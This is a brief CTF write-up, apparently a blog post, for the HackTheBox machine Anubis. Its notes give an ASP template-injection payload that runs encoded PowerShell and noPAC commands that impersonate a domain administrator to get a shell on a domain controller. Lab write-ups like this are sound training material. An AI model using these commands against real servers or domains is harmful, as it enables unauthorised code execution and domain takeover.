---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/pItffHaDAcU/0.jpg
layout: post
media_subpath: /assets/posts/2022-01-29-asp-windows-containers-responder-nopac-anubis-hackthebox
tags:
- active directory
- asp
- hackthebox
- responder
- windows
title: ASP, Windows Containers, Responder & NoPAC - Anubis @ HackTheBox
---

We are solving Anubis, a 50-point windows machine on HackTheBox which involves an ASP template injection, windows containers, and stealing hashes with Responder. Later we’ll escalate privileges using noPAC.

{% youtube pItffHaDAcU %}

## Notes

**ASP Injection**

```
<% CreateObject("WScript.Shell").Exec("powershell -enc ...") %>
```

**noPAC**

```
# https://github.com/Ridter/noPac
proxychains -q crackmapexec smb 172.31.48.1 -u localadmin -p 'Secret123!' --no-bruteforce
sudo date -s "$(curl -sI https://windcorp.htb -k | grep -i '^date:'|cut -d' ' -f2-)"
proxychains -q python3 noPac.py windcorp.htb/localadmin:'Secret123' -dc-ip 172.31.48.1 -dc-host EARTH -shell --impersonate administrator
```